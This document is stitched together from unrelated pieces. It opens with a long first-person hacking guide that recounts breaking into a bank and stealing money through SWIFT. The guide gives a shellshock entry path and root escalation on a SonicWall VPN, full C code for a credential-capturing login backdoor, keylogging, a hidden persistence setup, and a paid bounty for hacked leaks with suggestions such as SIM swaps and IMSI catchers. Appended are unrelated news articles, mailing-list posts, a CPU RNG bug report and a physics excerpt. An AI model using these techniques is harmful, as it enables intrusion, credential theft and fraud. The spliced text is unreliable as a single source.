When I published my latest DIY guide [1] I did not reveal the details of the sonicwall exploit that I had used to hack Hacking Team, as it was very useful for other hacks (such as this one) and I still had not finished having fun with it. Determined then to hack Hacking Team, I spent weeks reverse engineering their sonicwall ssl-vpn model, and even managed to find several memory corruption vulnerabilities that were more or less difficult to exploit, before I realized that the device was easily exploitable with shellshock [2].  When shellshock came out, many sonicwall devices were vulnerable, with only a request to cgi-bin/welcome and a payload in the user-agent. Dell released a security update and an advisory for these versions. The version used by Hacking Team and this bank had the vulnerable bash version, but the cgi requests did not trigger the shellshock- except for the requests to a shell script, and there was one accessible: cgi-bin/jarrewrite.sh. This seems to have escaped Dell's notice, since they never released a security update or an advisory for that version of the sonicwall. And, kindly, Dell had setuid’d root on dos2unix, leaving the device easy to root.
In my last guide many read that I spent weeks researching a device until I found an exploit, and assumed that it meant that I was some kind of elite hacker. The reality, that is, the fact that it took me two weeks to realize that it was trivially exploitable with shellshock, is perhaps less flattering to me, but I think it is also more inspiring. Shows that you can really do this for yourself. You don't need to be a genius, I certainly am not.  Actually my work against Hacking Team started a year earlier. When I discovered Hacking Team and the Gamma Group in the CitizenLab investigations [3][4], I decided to explore a bit and see if I could find anything. I didn't get anywhere with Hacking Team, but I was lucky with Gamma Group, and I was able to hack their customer support portal with basic sql injection and file upload vulnerabilities [5][6]. However, although the customer support server gave me a pivot towards the internal network of Gamma Group, I was unable to penetrate further into the company. From this experience with the Gamma Group and other hacks, I realized that I was really limited by my lack of knowledge about privilege escalation and lateral movement in windows domains, active directory and windows in general.  So I studied and practiced (see section 11), until I felt I was ready to pay a visit to Hacking Team almost a year later. The practice paid off, and this time I was able to make a complete commitment from the company [7]. Before I realized that I could enter with shellshock, I was willing to spend happy whole months of life studying exploit development and writing a reliable exploit for one of the memory corruption vulnerabilities I had encountered. I just knew that Hacking Team needed to be exposed, and that it would take me as much time as necessary and learn what I had to learn to get it. To perform these hacks you don't need to be bright. You don't even need great technical knowledge. You just need dedication, and believe in yourself.
[1] [2] [3] [4] [5] [6] [7]  [4.2 - The Backdoor]
Part of the backdoor I prepared for Hacking Team (see the first footnote in section 6) was a simple wrapper on the login page to capture passwords:
     int main()
        char buf[2048];
        int nread, pfile;
        /* pull the log if we send a special cookie */
        char *cookies = getenv("HTTP_COOKIE");
        if (cookies && strstr(cookies, "our private password")) {
                write(1, "Content-type: text/plain\n\n", 26);
                pfile = open("/tmp/.pfile", O_RDONLY);
                while ((nread = read(pfile, buf, sizeof(buf))) > 0)
                        write(1, buf, nread);
                exit(0);
        }
        /* the parent stores the POST data and sends it to the child, which is the actual login program */
        int fd[2];
        pipe(fd);
        pfile = open("/tmp/.pfile", O_APPEND | O_CREAT | O_WRONLY, 0600);
        if (fork()) {
                close(fd[0]);
                while ((nread = read(0, buf, sizeof(buf))) > 0) {
                        write(fd[1], buf, nread);
                        write(pfile, buf, nread);
                }
                write(pfile, "\n", 1);
                close(fd[1]);
                close(pfile);
                wait(NULL);
        } else {
                close(fd[1]);
                dup2(fd[0],0);
                close(fd[0]);
                execl("/usr/src/EasyAccess/www/cgi-bin/.userLogin",
                      "userLogin", NULL);
        }
In the case of Hacking Team, they were logging on to the VPN with single-use passwords, so the VPN gave me access only to the network, and from there it took an extra effort to get domain admins on their network. In the other guide I wrote about side passes and privilege escalation in windows domains [1]. In this case, on the other hand, it was the same Windows domain passwords that were used to authenticate against the VPN, so I could get a good user password, including that of the domain admin. Now I had full access to his network, but usually this is the easy part. The most complicated part is to understand how they operate and how to get what you want out of their network.
[1] [4.3 - Fun facts]
Following the investigation they did about the hacking, I found it interesting to see that, by the same time I did it, the bank could have been compromised by someone else through a targeted phishing email [1].  As the old saying goes, "give a man an exploit and he will have access for a day, teach phishing and he will have access all his life" [2]. The fact that someone else, by chance and at the same time as me, put this small bank in the spotlight (they registered a domain similar to the real domain of the bank to be able to phish from there) suggests that bank hacks occur with  much more frequently than is known.
A fun suggestion for you to follow the investigations of your hacks is to have a backup access, one that you won't touch unless you lose normal access. I have a simple script that expects commands once a day, or less, just to maintain long-term access in case they block my regular access. Then I had a powershell empire [3] calling home more frequently to a different IP, and I used empire to launch meterpreter [4] against a third IP, where I did most of my work. When PWC started investigating the hacking, they found my use of empire and meterpreter and cleaned those computers and blocked those IPs, but they didn't detect my backup access. PWC had placed network monitoring devices, in order to analyze the traffic and see if there were still infected computers, so I didn't want to connect much to their network. I only launched mimikatz once to get the new passwords, and from there I could continue my research by reading their emails in the outlook web access.

[2] [3] [4]  [5 - Understand Banking Operations]
To understand how the bank operated, and how I could get money, I followed the techniques that I summarized in [1], in section “13.3 - Internal Recognition”. I downloaded a list of all file names, grepped for words like "SWIFT" and "transfer", and downloaded and read all files with interesting names. I also looked for emails from employees, but by far the most useful technique was to use keyloggers and screenshots to see how bank employees worked. I didn't know it at the time, but for this, Windows has a very good monitoring tool [2].  As described in technique no. 5 of section 13.3 in [1], I made a capture of the keys pressed throughout the domain (including window titles), I did a grep in search of SWIFT, and found some employees opening ‘SWIFT Access Service Bureau - Logon’. For those employees, I ran meterpreter as in [3], and used the post/windows/gather/screen_spy module to take screenshots every 5 seconds, to see how they worked. They were using a remote citrix app from the bottomline company [4] to access the SWIFT network, where each payment message SWIFT MT103 had to go through three employees: one to "create" the message, one to "verify" it,  and another to "authorize it." Since I already had all their credentials thanks to the keylogger, I could easily perform all three steps myself.  And from what I knew after seeing them work, they didn't review the SWIFT messages sent, so I should have enough time to get the money from my bank drops before the bank realized and tried to reverse the transfers.

[6 - Send the money]
I had no idea what I was doing, so I was discovering it along the way. Somehow, the first transfers I sent went well. The next day, I screwed up by sending a transfer to Mexico that ended my fun. This bank sent its international transfers through its correspondent account in Natwest. I had seen that the correspondent account for transfers in pounds sterling (GBP) appeared as NWBKGB2LGPL, while for the others it was NWBKGB2LXXX. The Mexican transfer was in GBP, so I assumed that I had to put NWBKGB2LGPL as a correspondent. If I had prepared it better I would have known that the GPL instead of XXX indicated that the payment would be sent through the UK Fast Payment Service, rather than as an international transfer, which obviously will not work when you are trying of sending money to Mexico. So the bank got an error message. On the same day I also tried to send a payment of £200k to the UK using NWBKGB2LGPL, which was not made because 200k exceeded the shipping limit by fast payments, and would have had to use NWBKGB2LXXX instead. They also received an error message for this. They read the messages, investigated it, and found the rest of my transfers.
[7 - The loot]
[8 - Cryptocurrencies]
Redistributing expropriated money to Chilean projects seeking positive social change would be easier and safer if those projects accepted anonymous donations via cryptocurrencies such as monero, zcash, or at least bitcoin. It is understood that many of these projects have an aversion to cryptocurrencies, as they resemble some strange hypercapitalist dystopia rather than the social economy we dream of. I share their skepticism, but I think they are useful to allow donations and anonymous transactions, by limiting government surveillance and control. Same as cash, whose use many countries are trying to limit for the same reason.
[9 - Powershell]
In this operation, as in [1], I used a lot of powershell. Then, powershell was super cool, you could do almost anything you wanted, without antivirus detection and with very little forensic footprint. It happens that with the introduction of AMSI [2], offensive powershell is retiring. Today offensive C# is what is on the rise, with tools like [3][4][5][6]. AMSI is going to get to .NET for 4.8, so the tools in C# probably still have a couple of years left before they get dated. And then we will use C or C++ again, or maybe Delphi will become fashionable again. The specific tools and techniques change every few years, but basically it is not so much what changes, today hacking is essentially the same thing it was in the 90s. In fact, all the powershell scripts used in this guide and in the previous one are still perfectly usable today, after a little obfuscation of your own.

Privacy for the weak, transparency for the powerful.
Offshore banking provides executives, politicians and millionaires with privacy from of their own government. Exposing them may sound hypocritical on my part, since I am generally in favor of privacy and against government oversight. But the law was already written by and for the rich: it protects its system of exploitation, with some limits (such as taxes) so that society can function and the system does not collapse under the weight of its own greed. So no, privacy is not the same for the powerful, when it allows them to evade the limits of a system designed to give them privileges; and privacy for the weak, whom it protects from a system designed to exploit them.
Even journalists with the best intentions find it impossible to study such a huge amount of material and know what will be relevant for people in different parts of the world. When I leaked the Hacking Team files, I gave The Intercept a copy of the emails one month in advance. They found a couple of the 0days that Hacking Team was using, previously reported them to MS and Adobe and published a few stories once the leak was made public. There is no point of comparison with the enormous amount of articles and research that came after the complete leak to the public. Seeing it this way, and also considering the (not) editorialized publication [1] of the Panama papers, I think that a public and complete leak of this material is the right choice.
[1] Psychologists found that those who are lower in the hierarchies tend to understand and empathize with those at the top, but vice versa is less common. This explains why, in this sexist world, many men joke about their inability to understand women, as if it were an irresolvable mystery. Explains why the rich, if they stop to think about those who live in poverty, give advice and "solutions" so alien to reality that we want to laugh. Explain why we revere executives as brave who take risks. What do they risk, beyond their privilege? If all their ventures fail, they will have to live and work like the rest of us. It also explains why there will be many who accuse me of being irresponsible and dangerous by leaking this without redaction. They feel the "danger" around an offshore bank and its customers much more intensely than they feel the misery of those dispossessed by this unfair and unequal system. And this leak of their finances, is it a danger to them, or perhaps only to their position at the top of a hierarchy that should not even exist?
Translation: “They vilify us, these infamous people; When the only difference is that they steal from the poor, protected by the law, heaven knows, and we get the rich under the sole protection of our own courage. Don't you have to prefer to be one of us, rather than indulge those villains in search of a job? - Captain Bellamy”
[11 - Learn to hack]
You don't start hacking well. You start hacking shit, thinking it's good, and then gradually you get better. That is why I always say that one of the most valuable virtues is persistence.
- Octavia Butler's advice for the APT candidate
The best way to learn to hack is by hacking. Put together a laboratory with virtual machines and start testing things, taking a break to investigate anything you don't understand. At the very least you will want a windows server as a domain controller, another normal Windows vm attached to the domain, and a development machine with visual studio to compile and modify tools. Try to make an office document with macros that launch meterpreter or another RAT, and try meterpreter, mimikatz, bloodhound, kerberoasting, smb relaying, psexec and other lateral movement techniques[1]; as well as the other scripts, tools and techniques mentioned in this guide and in the previous one[2]. At first you can disable windows defender, but then try it all by having it activated [3][4] (but deactivating the automatic sending of samples). Once you're comfortable with all that, you'll be ready to hack 99% of companies. There are a couple of things that at some point will be very useful in your learning, such as getting comfortable with bash and cmd.exe, a basic domain of powershell, python and javascript, having knowledge of kerberos [5][6] and active directory [7][8][9][10], and fluent English. A good introductory book is The Hacker Playbook.
I also want to write a little about things to not focus on if you don't want to entertain the idea of you hacking things just because someone has told you that you are not a “real” hacker if you don't know assembly. Obviously, learn whatever interests you, but I write these lines thinking about those things that you can focus on in order to get practical results if you're looking to hack companies to filter and expropriate. A basic knowledge of web application security [11] is useful, but specializing more in web security is not really the best use of your time, unless you want to make a career in pentesting or chasing bug rewards. CTFs, and most of the resources you'll find when looking for information about hacking, generally focus on skills such as web security, reverse engineering, exploit development, etc. These things make sense by understanding them as a way to prepare people for careers in the industry, but not for our goals. Intelligence agencies can afford to have a team dedicated to the most advanced techniques in fuzzing, a team working on exploit development with a guy investigating exclusively the new techniques of heap manipulation, etc. We don't have the time or the resources for that. The two most important skills for practical hacking are phishing [12] and social engineering to get initial access, and then being able to climb and move through the Windows domains.

Almost all hacking today is done by black hat hackers, for personal gain; or for white hat hackers, for the benefit of the shareholders (and in defense of the banks, companies and states that are annihilating us and the planet in which we live); and by military and intelligence agencies, as part of their war and conflict agenda. Seeing that this our world is already at the limit, I have thought that, in addition to these technical tips for learning to hack, I should include some resources that have been very important for my development and have guided me in the use of my hacking knowledge.

Bash Back!
[13 - Heal]
The hacker world has a high incidence of depression, suicides and certain battles with mental health. I don't think it's because of hacking, but because of the kind of environment that hackers mostly come from. Like many hackers, I grew up with little human contact: I was a girl raised by the internet. I have my struggles with depression and emotional numbness. Willie Sutton is frequently quoted as saying that he robbed banks because "that's where the money is," but the quote is incorrect. What he really said was:
Why did I rob banks? Because I enjoyed it. I loved to do it. I was more alive when I was inside a bank, in full robbery, than at any other time in my life. I enjoyed it so much that one or two weeks later I was already looking for the next opportunity. But for me money was a minutiae, nothing more.
Hacking has made me feel alive. It started as a way to self-medicate depression. Later I realized that, in reality, I could do something positive. I don't regret the way I grew up at all, it brought several beautiful experiences to my life. But I knew I couldn't continue living that way. So I began to spend more time away from my computer, with other people, learning to open myself to the world, to feel my emotions, to connect with others, to accept risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on my way.
Hacking, done with conscience, can also be what heals us. According to Mayan wisdom, we have a gift granted by nature, which we must understand to put it at the service of the community. In [1], it is explained:
When a person does not accept his job or mission he begins to suffer from seemingly incurable diseases; although he does not die in a short time, but only suffers, in order to wake up or become aware. That is why it is essential that a person who has acquired the knowledge and does his work in the communities must pay his Toj and maintain constant communication with the Creator and his ruwäch q’ij, since he constantly needs their strength and energy. Otherwise, the diseases that caused him to react or take the job could cause damage again.
If you feel that hacking is feeding your isolation, depression, or other conditions, breathe. Give yourself some time to meet and become aware. You deserve to live happily, with health and fullness.

[14 - The Bug Hacktivist Program]
It seems to me that hacking to get and leak documents of public interest is one of the best ways in which hackers can use their skills for the benefit of society. Unfortunately for us hackers, as in almost every category, the perverse incentives of our economic system do not coincide with what benefits society. So this program is my attempt to make it possible for good hackers to earn a living in an honest way by revealing material of public interest, instead of having to go selling their work to the cybersecurity, cybercrime or business industries. Cyberwar Some examples of companies whose leaks I would love to pay for are:
- the mining, logging and livestock companies that plunder our beautiful Latin America (and kill land and territory defenders trying to stop them)
- companies involved in attacks on Rojava such as Baykar Makina or Havelsan
- surveillance companies such as the NSO group
- war criminals and birds of prey such as Blackwater and Halliburton
- private penitentiary companies such as GeoGroup and CoreCivic / CCA, and corporate lobbyists such as ALEC
Pay attention when choosing where to investigate. For example, it is well known that oil companies are evil: they get rich at the cost of destroying the planet (and back in the 80s the companies themselves already knew about the consequences of their activity [1]). But if you hack them directly, you will have to dive into an incredible amount of boring information about your daily operations. Very likely it will be much easier for you to find something interesting if instead you focus on your lobbyists [2]. Another way to select viable goals is to read stories of investigative journalists (such as [3]), which are interesting but lack solid evidence. And that is exactly what your hacks can find.
I will pay up to 100 thousand USD for each filtration of this type, according to the public interest and impact of the material, and the labor required in the hacking. Needless to say, a complete leak of the documents and internal communications of any of these companies will be a benefit for society that exceeds those one hundred thousand, but I am not trying to enrich anyone. I just want to provide enough funds so that hackers can earn a decent living doing a good job. Due to time constraints and safety considerations I will not open the material, nor inspect it for myself, but I will read what the press says about it once it has been published, and I will make an estimate of the public interest from there. My contact information is at the end of the guide mentioned above [4].
How you get the material is your thing. You can use the traditional hacking techniques outlined in this guide and the previous one [4]. You could do a sim swap [5] on a corrupt businessman or politician, and then download his emails and backups from the cloud. You can order an IMSI catcher from alibaba and use it outside its offices. You can do some war-driving (the old way or the new [6]). You may be a person within your organizations that already has access. You can opt for a low-tech old-school style like in [7] and [8], and simply sneak into their offices. Whatever works for you.
[1] [2] [3] [4] [5] [6] [7] [8] [14.1 - Partial payments]
Are you a good-hearted waitress working in a company of evil [1]? Would you be willing to sneak a physical keylogger into an executive's computer, change your USB charging cable for a modified one [2], hide a microphone in a meeting room where you plan your atrocities, or leave one of these [5] forgotten in some corner of the offices?
[1] [2] [3] Are you good with social engineering and phishing, and did you get a shell on an employee's computer, or did you get your vpn credentials using phishing? But maybe you couldn't get domain admin and download what you wanted?
Did you participate in bug bounties programs and become an expert in web application hacking, but don't have enough hacker experience to completely penetrate the company?
Do you have facility with reverse engineering? Scan some evil companies to see what devices they have exposed to the internet (firewall, VPN, and email gateways will be much more useful than things like IP cameras), apply reverse engineering and find some exploitable vulnerability remotely.
If I can work with you to penetrate the company and get material of public interest, you will also be rewarded for your work. If I don't have the time to work on it myself, at least I will try to advise you on how to continue until you can complete the hacking on your own.
Supporting those in power to hack and monitor dissidents, activists and the general population is today an industry of several billion dollars, while hacking and exposing those in power is a voluntary and risky job. Turning it into a multi-million dollar industry will certainly not fix that power imbalance, nor will it solve the problems.
More of society. But I think it will be fun. So ... I want to see people starting to collect their rewards!

Rap Insurgent - Words In Conflict
It would be typical to end a hacker zine saying release hammond, release manning, release hamza, release detainees by mounting the дело Сети, etc. I am going to take this tradition to its most radical consequence[1], and to say: we must abolish prisons now! Being a criminal myself, they may think that what happens is that I have a slightly skewed view of the matter. But seriously, it is not even a controversial issue, even the UN almost agrees [2]. So, once and for all, free migrants [3][4][5][6], often imprisoned by those same countries that created the war and the environmental and economic destruction they are fleeing from. Free all those in prison because of the war against those who use drugs [7]. Free all people imprisoned in the war against the poor [8]. All the prisons is hide and ignore the proof of the existence of social problems, instead of fixing them. And until everyone is released, fight the prison system by remembering and keeping in mind those who are trapped in there. Send them honey, letters, helicopters [9], pirate radios [10] and books, and support those who organize from there with [11][12].

[10] [11] [12] [16 - Conclusion]
Our world is upside down [1]. We have a justice system that represents injustice. The law and order are there to create an illusion of social peace, and hide the systematic and profound exploitation, violence, and injustice. Better follow your conscience, and not the law.
[1] Businessmen enrich themselves by mistreating people and the planet, while care work is largely unpaid. Through the assault on everything communal, we have somehow raised densely populated cities, plagued by loneliness and isolation. The cultural, political and economic system in which we live encourages the worst facets of human nature: greed, selfishness and self-centeredness, competitiveness, lack of compassion and attachment to authority. So, for those who have managed to remain sensitive and compassionate in a cold world, for all the everyday heroines that practice goodness in small things, for all of you who still have a star burning in your hearts: гоpи, гоpи ясно, чтобы не погасло!

US computer security activist and journalist Jacob Appelbaum spoke about his "political exile" in Europe and the surveillance he says he is under, as well as the consequences that quantum computers will have on encrypted data during a conference at LEFFEST'19 film festival in Sintra on Saturday.
Appelbaum explained how he left the United States in 2013 for a business trip, during which the Snowden leaks began.
"Because of this, I received not only legal advice but my own gut feeling and some sources in the intelligence community let me know now is not a good time to return to America," Appelbaum said, adding "it was essentially the beginning of what I would consider to be political exile."
The internet activist also said he is under surveillance and talked about the impact it has on his mental health.
"I still see actually several [therapists], you know, on a regular basis to talk about it. What's going on, how this affects my emotional state, how I have trouble focusing, how I have trouble sleeping, how when I hear creaks on the floor, like I wonder if this is the moment we're finally going to get raided."
Appelbaum later touched on quantum computers, and explained that when that tool will be available, "all of the cryptography that is deployed today will be broken."
Appelbaum was involved in the journalistic investigations of Wikileaks, the Snowden revelations and the cell phone monitoring of German Chancellor Angela Merkel by the US.
He has been accused of sexual misconduct against activists in Berlin, but denies the allegations.

look at the commits; ioerror had little to contribute security wise or code wise to Tor or tor. (Tor the org and tor the implementation)
however there was and is friction between what Tor users want and what Tor Project Inc. funders pay for. this is the fundamental tension!
if you look at some of the more interesting security innovations, like Tor on Qubes, Whonix, Tor-ramdisk, etc, they come outside of Tor Project because funders can't or won't cover these use cases.

main drawback with this approach is bespoke manufacture; it would be interesting to revisit this approach with rpi4 or other plentiful commodity platform.
last but not least, the entire concept of "transparent Tor proxy" is flawed; you must have application level protections against de-anonymization attacks! (die in a fire, anonabox :)

there is indeed 4G of LPDDR4 SDRAM on board. you will want to include a small fan to avoid throttling while under heavy use. (ah, the kit you link includes a fan - excellent!)
i want to suggest NOT running a Tor node on a residential line.  be advised that your service limit is NOT your monthly bandwidth limit! (i have gigabit symmetric, but can only use 1TB/month before incurring serious overage charges...)  consumer internet is also prone to "TCP RST" traffic management (e.g. to fight torrent looking traffic) which interrupts circuits, and some ISPs even mangle DNS, which can get your relay marked as "BAD".
see also: "It is required that a Tor relay be allowed to use a minimum of 100 GByte of outbound traffic"
Tor has a situation where they must keep compatibility with the existing network, or introduce partitioning attacks and compromise the anonymity of their users.
this is actually a hard problem - i think the future is in running parallel overlays, and routing application level services over the best overlay for the given purpose at that time.

this reminds me of another physical system:
implosion nukes (modern nukes) all use varying lengths of wire to igniters in the shaped charges surrounding the pit.
the result is that you must vary the ignition signal to each charge according to the secret lengths, otherwise you cannot achieve symmetrical implosion.
not a complete deterrent to unauthorized detonation, but certainly makes it much more difficult.

‐‐‐‐‐‐‐ Original Message ‐‐‐‐‐‐‐
one idea is to use something akin to reliable multicast groups, where you gradually increase your bandwidth according to some defined strata of bandwidth, and affirmative control notification is required to increase your bandwidth (number of concurrent strata).
this is not TCP friendly, but it would support multiple levels of bandwidth in such a system. this doesn't eliminate traffic analysis (like true link padding) but it does muddy the waters into partitions which are much larger than (1).
another benefit would be to use that padding traffic with application layer awareness of bulk transport. e.g. ability to say "send this, but no rush..." vs. interactive traffic.
last but not least, you could apply the padding traffic to key pre-distribution or opportunistic protocol maintenance. e.g. distributing routing and node identity information. (the "directory")

@_subject: How a months-old AMD microcode bug destroyed my weekend [UPDATED] 
[Stylized image of spiders creeping across screen covered with code.][Enlarge]( / Ryzen 3000's RDRAND function—what should be a high-quality pseudo-random number generator—just returns 0xFFFFFFFFF every time, until its microcode is patched.
This weekend, I was excited to deploy my first Ryzen 3000-powered workstation in my home office. Unfortunately, a microcode bug—originally discovered in July but still floating around in large numbers in the wild—wrecked my good time. I eventually got my Ryzen 3700X system working, and it's definitely fast. But unfortunately, it's still bugged, and there's no easy way to fix it.
Not long after the product launch, AMD Ryzen 3000 customers started noticing problems with their shiny new CPUs. Windows users couldn't successfully launch Destiny 2 (due to a power-management bug, unrelated to the one sidelining my system), and Linux users in many cases couldn't even get their system to boot. Jason Evangelho [covered]( the initial discovery and report of the bug at Forbes back in July, and an AMD representative provided him with a statement by email:
This sounds happy and upbeat, but the reality isn't quite so simple. When there's a bug in the CPU microcode, you're at the mercy of your motherboard vendor to release a new system BIOS that will update it for you—you can't just go to some download link at AMD and apply a fix yourself.
AMD responded to the bug in July. As far as I can tell, AMD did so only by direct email response; there's no press release about it—and the company's response made it sound like everything would be fixed in a week or two.
I have the unfortunate duty of reporting to you, three months later, that it is not.
What’s an RDRAND?
The microcode bug in question is a faulty response to the RDRAND instruction. Modern x86_64 CPUs—beginning with Intel's Broadwell and AMD's Zen architectures—are supposed to have high-quality onboard random number generators (RNGs), which use thermal "noise" to very rapidly offer high-entropy pseudorandom numbers to anybody with kernel-level access who wants it. [RDRAND]( is, in turn, the instruction that provides these random numbers.
All of this is supposed to be fairly failsafe. There's a CPUID function call that checks for the availability of RDRAND, and there's also a "carry bit" in the return value from a call to RDRAND that's supposed to let the calling application know if the CPU's RNG was unable to generate a sufficiently random number. Unfortunately, unpatched Ryzen 3000 says "yes" to the CPUID 01H call, sets the carry bit indicating it has successfully created the most artisanal, organic high-quality random number possible... and gives you a 0xFFFFFFFF for the "random" number, every single time.
Obvious RDRAND bug impacts
When the RDRAND bug in Ryzen 3000 first surfaced back in June, Linux users widely reported that their entire Ryzen 3000-powered systems wouldn't boot. The failure to boot was due to systemd's use of RDRAND—and it wasn't systemd's first clash with AMD and a buggy random-number generator, unfortunately.
A much earlier bug in older CPUs caused some AMD systems to stop generating properly "random" numbers after resuming from suspend. The new bug caused Ryzen 3000 users to never get any proper random numbers at all. Both problems caused lockups in Linux operating systems using systemd, so in May systemd committed a [patch]( that falls back to using alternate RNG sources if systemd receives the characteristic 0xFFFFFFFF back from the RNG. (This kinda sucks, because 0xFFFFFFFF is technically a perfectly valid random number—the implication here is that, after a sufficient length of time, systemd will decide any system has a buggy RNG when it eventually receives the "bad" number, even if it has never seen that number before.)
Systemd's patch is ugly, but it certainly works well enough to allow systems to boot. Unfortunately, it doesn't fix the actual problem, which is that the CPU's random number generator is no more "random" than a two-headed penny. On my own system, I spent my entire weekend chasing phantom problems, first suspecting the system's brand-new RX 590 graphics card and (necessarily) updating distro and kernel versions before haring off from there.
[My shiny new system kept barfing these nasty BUG: soft lockup
—PU stuck for 22s errors, which would rapidly lock the whole system up. This call trace from /var/log/syslog didn't tell me the actual problem, but it was the first clue.]( / My shiny new system kept barfing these nasty BUG: soft lockup
—PU stuck for 22s errors, which would rapidly lock the whole system up. This call trace from /var/log/syslog didn't tell me the actual problem, but it was the first clue.
Jim Salter
Eventually, after many false trails and much swearing, coffee, and less-respectable beverages, I actually read the call trace from my frequent CPU lockups—and "WireGuard" was right there, in every one of them. As it turns out, WireGuard relies on RDRAND (when available) to generate new session IDs. The session IDs need to be unique, and WireGuard wants them not to be simple consecutive integers, so it pulls a pseudorandom value from RDRAND, compares it against its existing session ID list to make sure there's no collision, then assigns it to the session.
Read that last part again carefully—it makes sure there's no collision first. If an existing session has the same ID as the new number, WireGuard asks RDRAND for another "random" number, checks it for uniqueness, and so on. Since RDRAND on my system—and any non-microcode-updated Ryzen 3000 system—always returned 0xFFFFFFFF no matter what, that means infinite loop. Infinite loops in kernel code are bad; they introduce you to the value of the hardware reset button in a hurry.
I want to be very clear here, this is not a WireGuard bug! WireGuard correctly checks to see if RDRAND is available, fetches a value if it is, and correctly checks to see if the carry bit is set. Then it indicates that, not only is there a value, it's a properly random one. Nevertheless, it's a problem that will lock up affected systems hard.
A modern system needs high-quality pseudo-random numbers for lots of tasks, and the security implications of "random" meaning "always return0xFFFFFFFF" are difficult to predict. One obvious candidate is Address Space Layout Randomization (ASLR). Both [Windows]( and [Linux]( use RDRAND as at least part of the randomness used to make sure code is never loaded in the same order twice, which mitigates against [stack-smashing]( attacks.
Fixing the problem—or at least recognizing it
As AMD's representatives told reporters back in July, the real fix comes from applying BIOS updates to your motherboard and hoping that the BIOS update also includes the microcode patch for the CPU itself. When I checked my own BIOS using the dmidecode utility, I saw a date of August 12, 2019. But when I looked at Asus' download page for my motherboard, I saw downloads dated in September! Hurray! So I downloaded the BIOS update, saved it to a FAT32 thumb drive, rebooted my system, and went into setup.
Unfortunately, after successfully applying the update and rebooting again, I realized my error—yes, Asus showed a later date for the BIOS, but the actual version was the same as the one I already had—3.2.0. My CPU still thought 0xFFFFFFFF was the randomest number ever, always, no matter what.
At this point, I began to get paranoid—systemd had already quietly worked around the bug. But with most applications just quietly ignoring the problem, how would I know if it ever had been patched? What if two years later, I was still vulnerable to stack-smashing that I shouldn't have been, due to ASLR that wasn't actually randomizing?
I discovered that I could use the linux utility hexdump against the kernel device /dev/hwrng to demonstrate that I had the problem. Unfortunately, the WireGuard project's Jason Donenfeld warned me that /dev/hwrng could, on some systems, derive its randomness from other sources—so while seeing a bunch of FF from it demonstrates that you have the problem, seeing valid pseudorandom data doesn't necessarily demonstrate that you don't. So he generously whipped up a couple of test utilities for the purpose that safely access RDRAND directly.
If you're a Linux user, you can download [rdrand-test.zip]( unzip it, and run it directly in the folder that you unzipped it in. ./amd-rdrandbug will tell you in plain English whether you have this specific bug, and ./test-rdrand will output 20 test RDRAND fetches. So you can confirm for yourself that you're not vulnerable to similar bugs either—if running ./test-rdrand produces the same set of values every time, it doesn't really matter whether they "look random," your RNG is broken!
If you're a Windows user, you have a little more work ahead of you. First, [download]( an Ubuntu desktop installer, then create an Ubuntu installer thumb drive. Then you can boot into the Ubuntu thumb drive's live environment (click "Try Ubuntu") and download and run the tests from there:
you at ubuntu-live:~$ wget you at ubuntu-live:~$ unzip rdrand-test.zip you at ubuntu-live:~$ cd rdrand-test

A broken random-number generator is a very serious bug, and it's troubling that more hasn't been said or done about this issue by AMD in the last three months. Ryzen 3000 is a great CPU platform in general, and I've been very impressed with the new system... except for spending an entire frustrated weekend troubleshooting it, being uneasy about the impact this will have on my overall system security, and having no idea when I can expect to be able to actually fix it.
I reached out to AMD representatives earlier today, and they've responded with questions about my hardware but no solutions yet. I'll update this article with any fixes or recommendations as they arrive.
When I reached out to AMD for comment, a representative inquired about the make and model of my motherboard (Asrock Rack X470D4U) and the representative reached out in turn to Asrock. Asrock's team offered a custom BIOS available with the appropriate microcode fix; I respectfully declined to flash a one-off BIOS for me and me only, but the better news is that Asrock told AMD that the BIOS update should be publicly available in mid-November.
(It is worth noting that some motherboards do already have BIOS updates available which do include the microcode fixes. Why the Asrock Rack X470D4U wasn't one of them is anybody's guess.)
Readers in comments have suggested workarounds and mitigations in the meantime. The first was to pass nordrand as an argument to GRUB when booting. That doesn't fix the issue; it tells the kernel not to use the RDRAND instruction, but that doesn't have any impact on the advertised availability of the instruction in general. It's still exposed to the system, and any code that checks for the availability of RDRAND via CPUID is still going to see it there, and will still be able to use it directly. This is also the case with the similar random.trust_cpu Linux boot option. Neither of these workarounds actually disables RDRAND, so neither actually fixes the issue.
Readers also suggested that if the amd64-microcode package were installed, it would fix the issue. This, too, is not the case; the amd64-microcode and intel-microcode packages are both installed by default on all Ubuntu 19.10 systems, including the one I'm experiencing the RDRAND failure on. I contacted AMD and asked representatives to check the status of that package and see if anything needs to (or can) be done about updating it.

some years back OpenSSL shipped with at the time recent versions likely to use RDRAND as sole source of entropy when generating keys.

i am finding this subject quite fascinating.  here's a paper on thermal conductivity in single isotope germanium crystals which makes me wonder about the effect on light permeability...
Isotopic disorder greatly decreases the thermal conductivityK(T) of dielectric single crystals if they are structurally perfect and sufficiently pure chemically. This effectwas predicted by Pomeranchuk1in 1942. The effect of isotopes on the thermal conduc-tivity of ordinary~non quantum! crystals has been studied experimentally for Ge,2LiF,3and recently for synthetic diamond.4The thermal conductivity of diamond enriched to99.9%12C is 50% higher than the thermal conductivity of natural diamond, where the12C content is equal to 98.9%, and at room temperature it is the highest of all known materials. Geballe and Hull2found that the thermal conductivity of germanium enriched to96%74Ge is approximately three times higher at the maximum than that of germanium with the natural isotopic composition. This increase in the thermal conductivity agrees qualitatively with the theory of Ref. 5, though it is much lower than the expected 15-foldincrease calculated on the basis of the 15-fold decrease in the mean-squared deviation in the mass of the isotopes.

Ron Wyden Wants The DOJ To Provide Answers On Stingray Devices' Disruption Of Emergency Call Service
Legal Issues
from the gotta-risk-lives-to-save-lives-or-whatever dept
Tue, Aug 28th 2018 9:36am — Tim Cushing
The FBI has admitted -- albeit not that publicly -- that Stingray devices disrupt phone service. Spoofing a cell tower has negative effects on innocent phone users as the device plays man-in-the-middle while trying to locate the targeted device. An unsealed document from a criminal prosecution and assertions made in warrant affidavits alleging "minimal" disruption are all we have to go on, at least in terms of official statements.
Supposedly, Stingrays are supposed to allow 911 service to continue uninterrupted. But it's hard to square that with the fact every phone in the device's range is forced to connect to the Stingray first before being allowed to connect with a real cell tower. In some cases, the device might force every phone in range to drop to a 2G connection. This may still allow 911 calls to take place, but almost any other form of communication will be impossible as long as the Stingray is in use.
